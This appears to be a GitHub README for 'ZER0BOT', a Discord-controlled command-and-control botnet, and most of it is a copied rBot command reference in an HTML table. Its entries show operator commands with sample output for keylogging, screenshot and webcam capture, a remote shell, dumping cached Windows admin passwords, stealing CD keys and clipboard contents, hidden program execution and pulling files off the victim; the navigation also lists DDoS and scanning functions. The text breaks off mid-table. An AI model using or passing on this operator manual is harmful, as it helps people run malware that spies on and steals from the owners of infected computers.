# ZER0BOT V2.1 🐐

> <body><i><strong> ZER0 BOT The discord API turns your discord chat channel into a C&C server! <BR />
> You can add or remove methods, tools,...</strong></i></body>
![zerobotdiscord](https://github.com/R4GN4R0K-SEC/ZER0BOT/assets/74421852/9d381da5-fb6c-4133-8257-120ad57d159a)

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML>
<DIV style="WIDTH: 100%; TEXT-ALIGN: center;">
<h2 style="FONT-SIZE: 200%; FONT-WEIGHT: bold;">rBot Command Reference</h2>

<DIV style="MARGIN: 0px 0px 7px 0px;">
<h4><i style="FONT-SIZE: 80%;"><have funhave funhave funh3>For Use With Most rBots(This Command List Has added commands for "rBot" <BR />
"Modded By DonttCare AKA D0NTTCARE" </i></h4>

<P style="FONT-SIZE: 80%; FONT-WEIGHT: bold;">
<A href="#general_commands">General Commands</A> - <A href="#scanning">Scanning Functions</A> -
<A href="#clones">Clones</A> - <A href="#ddos">DDoS Functions</A> -
<A href="#download_update">Downloading & Updating</A> - <A href="#redirecting">Redirecting</A> - 
<A href="#ftp">FTP Functions</A>
</P>
</DIV>
<TABLE style="WIDTH: 100%;" cellspacing="2">
<TR>
<TD class="headers" style="WIDTH: 12%;">Command Name</TD>
<TD class="headers" style="WIDTH: 5%;">Alias</TD>
<TD class="headers" style="WIDTH: 26%;">Syntax</TD>
<TD class="headers" style="WIDTH: 26%;">Command Information</TD>
<TD class="headers" style="WIDTH: 31%;">Example</TD>
</TR>

<!--
General Commands
-->
<TR>
<TD class="headers">
<A href="#general_commands" name="general_commands">General Commands</A></TD>
</TR>
<TR>
<TD>
action
</TD>
<TD>
a
</TD>
<TD>
.a &lt;channel/user&gt; &lt;message&gt;
</TD>
<TD>
Causes a action to &lt;channel/user&gt; with &lt;message&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .action #channel implodes irrationally<BR />
[In #channel...]<BR />
* camel implodes irrationally<BR />
</TD>
</TR>

<!-- 
addalias
-->
<TR>
<TD>
addalias
</TD>
<TD>
aa
</TD>
<TD>
.aa &lt;alias name&gt; &lt;command&gt;
</TD>
<TD>
Add an alias by the name of &lt;alias name&gt; and executes &lt;command&gt;
when called.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .addalias hello privmsg $chan hello<BR />
&lt;<SPAN class="user">@moose</SPAN>&gt; .hello<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; hello<BR />
</TD>
</TR>

<!-- 
aliases 
-->
<TR>
<TD>
aliases
</TD>
<TD>
al
</TD>
<TD>
.aliases
</TD>
<TD>
Displays all the current aliases (if any).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .aliases<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; -[alias list]-<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 0. opme = mode $chan +o $user<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 1. spastic = syn $1 445 120
</TD>
</TR>

<!-- 
capture 
-->
<TR>
<TD>
capture
</TD>
<TD>
cap
</TD>
<TD>
<B>Screenshot</b><BR />
.capture screen &lt;filename&gt;<BR />
<B>Webcam Image</b><BR />
.capture frame &lt;filename&gt; &lt;input no.&gt; &lt;width&gt; &lt;height&gt;<BR />
<B>Video</b><BR />
.capture video &lt;filename&gt; &lt;input no.&gt; &lt;length&gt; &lt;width&gt; &lt;height&gt;
</TD>
<TD>
Generates an image of the what ever requested. Can be from a webcam, desktop
or even make a movie from a webcam. (Generates a ~3MB file for screenshots)
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .capture screen C:\Screenshot.jpg<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CAPTURE]: Screen capture saved to: C:\Screenshot.jpg.
</TD>
</TR>

<!-- 
clearlog 
-->
<TR>
<TD>
clearlog
</TD>
<TD>
clg
</TD>
<TD>
.clearlog
</TD>
<TD>
Clears whatever has been logged since the start.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .clearlog<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [LOGS]: Cleared.
</TD>
</TR>

<!-- 
clone 
-->
<TR>
<TD>
clone
</TD>
<TD>
c
</TD>
<TD>
.clone &lt;server&gt; &lt;port&gt; &lt;channel&gt; [channel key]
</TD>
<TD>
Creates a clone on the server in the channel specified.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .clone irc.easynews.com 6667 #moose<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CLONES]: Created on irc.easynews.com:6667, in channel #moose.
</TD>
</TR>

<!--
cmd 
-->
<TR>
<TD>
cmd
</TD>
<TD>
cm
</TD>
<TD>
.cmd &lt;remote command&gt;
</TD>
<TD>
Sends &lt;command&gt; to an open remote console.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .cmd dir<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CMD]: Commands: dir
</TD>
</TR>

<!-- 
cmdstop 
-->
<TR>
<TD>
cmdstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.cmdstop
</TD>
<TD>
Stops a remote console.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .cmdstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CMD] Remote shell stopped. (1 thread(s) stopped)
</TD>
</TR>

<!-- 
crash 
-->
<TR>
<TD>
crash
</TD>
<TD>
&nbsp;
</TD>
<TD>
.crash
</TD>
<TD>
Crashes the bot. *Dont Do this unless you want the bot to die*
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .crash<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Crashing bot.
</TD>
</TR>

<!-- 
currentip
-->
<TR>
<TD>
currentip
</TD>
<TD>
cip
</TD>
<TD>
.currentip [thread number]
</TD>
<TD>
Returns the current IP scanning, or IP from the [thread number].
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .currentip<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SCAN]: Scanning IP: 24.222.212.37, Port: 139.
</TD>
</TR>

<!-- 
cycle 
-->
<TR>
<TD>
cycle
</TD>
<TD>
cy
</TD>
<TD>
.cycle &lt;delay&gt; &lt;channel&gt; [key]
</TD>
<TD>
Parts &lt;channel&gt;, waits &lt;delay&gt; seconds and joins again with [key].
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .cycle 5 #help<BR />
* camel has left the channel.<BR />
&nbsp;[5 seconds later...]<BR />
* camel has joined the channel.
</TD>
</TR>

<!-- 
delay 
-->
<TR>
<TD>
delay
</TD>
<TD>
de
</TD>
<TD>
.delay &lt;number in seconds&gt; &lt;command&gt;
</TD>
<TD>
Sleeps for &lt;seconds&gt; and then executes &lt;command&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .delay 10 .quit<BR />
 [10 seconds later...]<BR />
* camel has quit (Quit: later)
</TD>
</TR>

<!-- 
delete
-->
<TR>
<TD>
delete
</TD>
<TD>
del
</TD>
<TD>
.delete &lt;file&gt;
</TD>
<TD>
Removes &lt;file&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .delete C:\Screenshot.jpg<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FILE]: Deleted 'C:\Screenshot.jpg'.
</TD>
</TR>

<!-- 
die 
-->
<TR>
<TD>
die
</TD>
<TD>
&nbsp;
</TD>
<TD>
.die
</TD>
<TD>
Kills all the threads and the bot, does not perform any clean up actions.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .die<BR />
* camel has quit (Quit: Connection Reset by Peer)
</TD>
</TR>

<!-- 
disconnect 
-->
<TR>
<TD>
disconnect
</TD>
<TD>
dc
</TD>
<TD>
.disconnect
</TD>
<TD>
Disconnects the bot from the server, but keeps the process running. Reconnects 30 minutes later. (No threads are killed).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .disconnect<BR />
* camel has quit (Quit: later.)
</TD>
</TR>

<!--
dns 
-->
<TR>
<TD>
dns
</TD>
<TD>
&nbsp;
</TD>
<TD>
.dns &lt;ip/host&gt;
</TD>
<TD>
Resolves &lt;ip/host&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .dns www.google.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DNS]: Lookup: www.google.com -> 216.239.33.101.
</TD>
</TR>

<!-- 
driveinfo
-->
<TR>
<TD>
driveinfo
</TD>
<TD>
drv
</TD>
<TD>
.driveinfo
</TD>
<TD>
Returns total, free, and used space on all available drives.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .driveinfo<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Disk Drive (C:\): 10,506,476KB total, 4,456,888KB free, 4,456,888KB available.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Cdrom Drive (D:\): Failed to stat, device not ready.
</TD>
</TR>

<!--
email
-->
<TR>
<TD>
email
</TD>
<TD>
&nbsp;
</TD>
<TD>
email &lt;server&gt; &lt;port&gt; &lt;sender&gt; &lt;to&gt; &lt;subject&gt;
</TD>
<TD>
Sends an email to &lt;to&gt; from &lt;sender&gt; with &lt;subject&gt; using 
&lt;server&gt;:&lt;port&gt; *Although I DO NOT recomend useing this command, if entered wrong it can be very buggy and crash the bot

</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .email pop3.hotmail.com 110 linus@linux.org bill@microsoft.com Linux &gt; Microsoft<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [EMAIL]: Message sent to bill@microsoft.com.
</TD>
</TR>

<!--
encrypt
-->
<TR>
<TD>
encrypt
</TD>
<TD>
enc
</TD>
<TD>
.encrypt
</TD>
<TD>
I'm not sure what this actually does. From what I read, it encrypts something, but only when
DUMP_ENCRYPT is enabled. It may even dump out the config file encrypted...
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .encrypt<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; SOMETHING HERE!
</TD>
</TR>

<!--
execute
-->
<TR>
<TD>
execute
</TD>
<TD>
e
</TD>
<TD>
.execute &lt;visibilty&gt; &lt;file&gt;
</TD>
<TD>
Runs &lt;file&gt;. If visibility is 1, runs the program visible, and 0 runs it hidden.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .execute 1 notepad.exe<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SHELL]: File opened: notepad.exe 
</TD>
</TR>

<!--
findfile
-->
<TR>
<TD>
findfile
</TD>
<TD>
ff
</TD>
<TD>
.findfile &lt;wildcard&gt; [directory]
</TD>
<TD>
Searches for &lt;wildcard&gt; in the active directory (or [directory]) and returns the results.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .findfile *screenshot* c:\<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FINDFILE]: Searching for file: *screenshot*.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Found: C:\Screenshot.jpg<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FINDFILE]: Files found: 1.
</TD>
</TR>

<!--
findfilestop
-->
<TR>
<TD>
findfilestop
</TD>
<TD>
ffstop
</TD>
<TD>
.findstop
</TD>
<TD>
Stops searching for a file. (Pointless though, as there is already a loop going and it won't be able
to stop this loop until it has finished. So be warned, don't use findfile :-P)
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .findfilestop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FINDFILE] Find file stopped. (1 thread(s) stopped)
</TD>
</TR>

<!--
findpass
-->
<TR>
<TD>
findpass
</TD>
<TD>
fp
</TD>
<TD>
.findpass
</TD>
<TD>
FindPass decodes and displays administrator logon credentials from Winlogon 
in Win2000 / Winnt4 + < sp6. Windows 2000 and Windows NT administrator passwords 
are CACHED by WinLogon using the Microsoft Graphical Identification and Authentication 
(MSGINA.DLL) module.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .findpass<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FINDPASS]: The Windows logon (Pid: &lt;111&gt;) information is: Domain: \\Windows, User: (Bill Gates/(no password)).
</TD>
</TR>

<!--
flusharp
-->
<TR>
<TD>
flusharp
</TD>
<TD>
farp
</TD>
<TD>
.flusharp
</TD>
<TD>
Flushes the ARP cache (what ever use that is).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .flusharp<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FLUSHDNS]: ARP cache flushed.
</TD>
</TR>

<!--
flushdns
-->
<TR>
<TD>
flushdns
</TD>
<TD>
fdns
</TD>
<TD>
.flushdns
</TD>
<TD>
Flushes the DNS cache (what ever use that is).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .flushdns<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FLUSHDNS]: DNS cache flushed.
</TD>
</TR>

<!--
get
-->
<TR>
<TD>
get
</TD>
<TD>
gt
</TD>
<TD>
.get &lt;file&gt;
</TD>
<TD>
Sends a file via DCC.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .get C:\Screenshot.jpg<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DCC]: Send File: C:\Screenshot.jpg, User: moose.
</TD>
</TR>

<!--
getcdkeys
-->
<TR>
<TD>
getcdkeys
</TD>
<TD>
key
</TD>
<TD>
.getcdkeys
</TD>
<TD>
Returns keys of products installed on the computer. Includes games and Microsoft products.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .getcdkeys<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Microsoft Windows Product ID CD Key: (11111-640-1111111-11111)<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CDKEYS]: Search completed.
</TD>
</TR>

<!--
getclip
-->
<TR>
<TD>
getclip
</TD>
<TD>
gc
</TD>
<TD>
.getclip
</TD>
<TD>
Prints out whatever is in the clipboard at that time.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .getclip<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; -[Clipboard Data]-<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; http://www.goat.cx
</TD>
</TR>

<!--
gethost
-->
<TR>
<TD>
gethost
</TD>
<TD>
gh
</TD>
<TD>
.gethost &lt;search for hostname&gt; [command]
</TD>
<TD>
Searches for wildcard in hostname, if true, executes commands.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .gethost microsoft.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [NETINFO]: [Type]: LAN (LAN Connection). [IP Address]: 207.46.134.155. [Hostname]: microsoft.com.
</TD>
</TR>

<!--
httpcon
-->
<TR>
<TD>
httpcon
</TD>
<TD>
hcon
</TD>
<TD>
.hcon &lt;host&gt; &lt;port&gt; &lt;method&gt; &lt;file&gt; &lt;referrer&gt;
</TD>
<TD>
Connects to &lt;host&gt;:&lt;port&gt; with &lt;method&gt; &lt;file&gt;, using  &lt;referrer&gt;
as it's referrer. (Has a tendancy to crash the bot, don't ask me why).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .httpcon 24.222.212.37 80 GET / http://www.google.com<BR />
*crashes*
</TD>
</TR>

<!--
httpstop
-->
<TR>
<TD>
httpstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.httpstop
</TD>
<TD>
Stops the webserver running on the port in config.h.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .httpstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [HTTPD]: Server stopped. (1 thread(s) stopped.)
</TD>
</TR>

<!--
httpserver
-->
<TR>
<TD>
httpserver
</TD>
<TD>
http
</TD>
<TD>
.httpserver [port] [directory]
</TD>
<TD>
Starts a webserver on the port specified in config.h, and
with a root dir of C:\. Uses alternative options if specified.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .http<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [HTTPD]: Server listening on IP: 216.239.33.101:81, Directory: \.
</TD>
</TR>

<!--
id
-->
<TR>
<TD>
id
</TD>
<TD>
i
</TD>
<TD>
.id
</TD>
<TD>
Returns the ID.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .id<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Camel-toe.
</TD>
</TR>

<!--
identd
-->
<TR>
<TD>
identd
</TD>
<TD>
identd
</TD>
<TD>
.id &lt;on|off&gt;
</TD>
<TD>
Stops or starts the Identd server running.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .identd on<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [IDENTD]: Server running on Port: 113.
</TD>
</TR>

<!--
join
-->
<TR>
<TD>
join
</TD>
<TD>
j
</TD>
<TD>
.join &lt;channel&gt; [key]
</TD>
<TD>
Joins &lt;channel&gt; (with [key]).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .join #chat<BR />
[In #chat...]
* camel has joined #chat
</TD>
</TR>

<!--
keylog
-->
<TR>
<TD>
keylog
</TD>
<TD>
&nbsp;
</TD>
<TD>
.keylog &lt;on|off&gt;
</TD>
<TD>
A working keylogger. Outputs any input to file specified in config.h
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .keylog on<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [KEYLOG]: Key logger active.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [KEYLOG]:  (Changed Windows: C:\)
</TD>
</TR>

<!--
kill
-->
<TR>
<TD>
kill
</TD>
<TD>
ki
</TD>
<TD>
.kill &lt;pid&gt;
</TD>
<TD>
Kills a process according to it's PID.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .kill 4<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PROC]: Process killed ID: 4
</TD>
</TR>

<!--
killproc
-->
<TR>
<TD>
killproc
</TD>
<TD>
kp
</TD>
<TD>
.killproc &lt;process name&gt;
</TD>
<TD>
Kills a process according to it's name.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .kill system.exe<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PROC]: Process killed: system.exe
</TD>
</TR>

<!--
killthread
-->
<TR>
<TD>
killthread
</TD>
<TD>
k
</TD>
<TD>
.killthread &lt;all|thread number&gt;
</TD>
<TD>
Kills an internal thread.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .killthread 1<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [THREADS]: Killed thread: 1
</TD>
</TR>

<!--
list
-->
<TR>
<TD>
list
</TD>
<TD>
li
</TD>
<TD>
.list &lt;wildcard&gt;
</TD>
<TD>
List and searches for files using wildcard. (NB: Must be *wildcard*)
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .list *cmd*<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Searching for: *cmd*<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; login.cmd                        08/23/2001  09:30 PM  (487 bytes)<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Found 1 Files and 0 Directories<BR />
</TD>
</TR>

<!--
log
-->
<TR>
<TD>
log
</TD>
<TD>
lg
</TD>
<TD>
.log
</TD>
<TD>
Returns the log since it began. Contains: commands, logins, logouts and connections.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .list *cmd*<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [LOG]: Begin <BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 22:35:33] [MAIN]: User: moose logged in.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 20:49:35] [MAIN]: Joined channel: #moose.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 20:49:35] [IDENTD]: Client connection from IP: 24.222.212.37:22400.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 20:49:35] [MAIN]: Connected to irc.microsoft.com.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 20:49:35] [IDENTD]: Server running on Port: 113.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 20:49:35] [MAIN]: Bot started.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [LOG]: List complete.
</TD>
</TR>

<!--
login
-->
<TR>
<TD>
login
</TD>
<TD>
l
</TD>
<TD>
.login &lt;password&gt;
</TD>
<TD>
Logs a user in if the password is the same as the one in config.h.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .login xxxxxx<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Password accepted.
</TD>
</TR>

<!--
logout
-->
<TR>
<TD>
logout
</TD>
<TD>
lo
</TD>
<TD>
.logout [slot]
</TD>
<TD>
Logs out the user, it can also be used to log out other in active users.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .who<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; -[Login List]-<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 0. moose!moose@internet.yahoo.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 1. antelope!deer@i-own.blogspot.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 2. &lt;Empty&gt;<BR />
&lt;<SPAN class="user">@moose</SPAN>&gt; .logout 1<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: User antelope logged out
</TD>
</TR>

<!--
logstop
-->
<TR>
<TD>
logstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.logstop
</TD>
<TD>
Stops listing the log.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .logstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [LOG]: Log list stopped. (1 thread(s) stopped.)
</TD>
</TR>

<!--
mirccmd
-->
<TR>
<TD>
mirccmd
</TD>
<TD>
mirc
</TD>
<TD>
.mirc &lt;command&gt;
</TD>
<TD>
If a mIRC window is open, it will be feed through it as if you would have typed
it manually.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .mirccmd //scon -a ame is bored<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [mIRC]: Command sent.<BR />
[In every of the user's channels...]<BR />
* tomorrow is bored
</TD>
</TR>

<!--
mode
-->
<TR>
<TD>
mode
</TD>
<TD>
m
</TD>
<TD>
.mode &lt;channel&gt; &lt;modes&gt;
</TD>
<TD>
Changes modes in &lt;channel&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .mode #help +o moose<BR />
[In #help...]<BR />
* camel sets mode +o moose
</TD>
</TR>

<!--
 net
-->
<TR>
<TD>
net
</TD>
<TD>
&nbsp;
</TD>
<TD>
.net &lt;command&gt; [&lt;service&gt;/&lt;share name&gt;/&lt;username&gt;] [&lt;resource&gt;/&lt;password&gt;] [-d]
</TD>
<TD>
A basic net.exe.
</TD>
<TD>
<A href="#net_help">Net help</A>
</TD>
</TR>

<!--
 netinfo
-->
<TR>
<TD>
netinfo
</TD>
<TD>
ni
</TD>
<TD>
.netinfo
</TD>
<TD>
Returns network and IP information.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .netinfo<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [NETINFO]: [Type]: LAN (LAN Connection). [IP Address]: 207.46.134.155. [Hostname]: microsoft.com.
</TD>
</TR>

<!--
nick
-->
<TR>
<TD>
nick
</TD>
<TD>
n
</TD>
<TD>
.nick &lt;new nick&gt;
</TD>
<TD>
Changes nickname to the new one specified.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .nick marker<BR />
* camel is now know as marker
</TD>
</TR>

<!--
open
-->
<TR>
<TD>
open
</TD>
<TD>
o
</TD>
<TD>
.open &lt;file&gt;
</TD>
<TD>
Unlike execute, this isn't just limited to programs. Open can open web 
browsers and images.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .open http://www.mozilla.org/products/firefox<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SHELL]: File opened: http://www.mozilla.org/products/firefox
</TD>
</TR>

<!--
opencmd
-->
<TR>
<TD>
opencmd
</TD>
<TD>
ocmd
</TD>
<TD>
.opencmd
</TD>
<TD>
Executes a remote shell.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .opencmd<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CMD]: Remote shell ready.
</TD>
</TR>

<!--
part
-->
<TR>
<TD>
part
</TD>
<TD>
pt
</TD>
<TD>
.part &lt;channel&gt;
</TD>
<TD>
Parts &lt;channel&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .part #help<BR />
[In #help...]<BR />
* Parts: camel
</TD>
</TR>

<!--
prefix
-->
<TR>
<TD>
prefix
</TD>
<TD>
pr
</TD>
<TD>
.prefix &lt;new prefix&gt;
</TD>
<TD>
Changes the command prefix to the new one (up until the bot is restarted).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .prefix ?<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Prefix changed to: '?'.<BR />
&lt;<SPAN class="user">@moose</SPAN>&gt; ?ni<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [NETINFO]: [Type]: LAN (LAN Connection). [IP Address]: 207.46.134.155. [Hostname]: microsoft.com.
</TD>
</TR>

<!--
psniff
-->
<TR>
<TD>
psniff
</TD>
<TD>
&nbsp;
</TD>
<TD>
.psniff &lt;on|off&gt; [channel to output to]
</TD>
<TD>
A very buggy packet sniffer, gets into loop with the error messages. Not
recommended to be using this.
</TD>
<TD>
&nbsp;
</TD>
</TR>

<!--
privmsg
-->
<TR>
<TD>
privmsg
</TD>
<TD>
pm
</TD>
<TD>
.privmsg &lt;channel/user&gt; &lt;message&gt;
</TD>
<TD>
Messages &lt;channel/user&gt; with &lt;message&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .privmsg #chat Hello lusers.<BR />
[In #Chat...]<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Hello lusers.
</TD>
</TR>

<!--
procs
-->
<TR>
<TD>
procs
</TD>
<TD>
ps
</TD>
<TD>
.procs
</TD>
<TD>
Lists all the current processes.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .procs<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PROC]: Listing processes:<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt;  System (4)<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt;  smss.exe (380)<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt;  csrss.exe (436)<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PROC]: Process list completed.<BR />
etc.
</TD>
</TR>

<!--
process_stop
-->
<TR>
<TD>
process_stop
</TD>
<TD>
p_stop
</TD>
<TD>
.process_stop
</TD>
<TD>
Stops listing the processes
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .process_stop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PROC]: Process list stopped. (1 thread(s) stopped.)
</TD>
</TR>

<!--
quit
-->
<TR>
<TD>
quit
</TD>
<TD>
q
</TD>
<TD>
.quit [message]
</TD>
<TD>
Quits (if specified, with a message), kills all threads and closes.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .quit<BR />
* camel quit (Quit: later)
</TD>
</TR>

<!--
raw
-->
<TR>
<TD>
raw
</TD>
<TD>
r
</TD>
<TD>
.raw &lt;raw&gt;
</TD>
<TD>
Sends a raw to the server.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .raw QUIT :what.<BR />
* camel quit (Quit: what)
</TD>
</TR>

<!--
readfile
-->
<TR>
<TD>
readfile
</TD>
<TD>
rf
</TD>
<TD>
.readfile &lt;filename&gt;
</TD>
<TD>
Reads the contents of a file.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .read onelinefile.txt<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; This is one line<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Read file complete: onelinefile.txt
</TD>
</TR>

<!--
reboot
-->
<TR>
<TD>
reboot
</TD>
<TD>
&nbsp;
</TD>
<TD>
.reboot
</TD>
<TD>
Reboots the users machine.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .reboot<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Rebooting system.
</TD>
</TR>

<!--
reconnect
-->
<TR>
<TD>
reconnect
</TD>
<TD>
r
</TD>
<TD>
.reconnect
</TD>
<TD>
Reconnects, getting a new ident and nickname.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .reconnect<BR />
* camel has quit (Quit: Client Exited)<BR />
* qewuyuf has joined #moose
</TD>
</TR>

<!--
remove
-->
<TR>
<TD>
remove
</TD>
<TD>
rm
</TD>
<TD>
.remove
</TD>
<TD>
Removes the bot completely.*This will completly delete the bot and its registry so i highly advise you only do this if your closing down your bots or you accidently installed it on your computer*
</TD>
<TD>
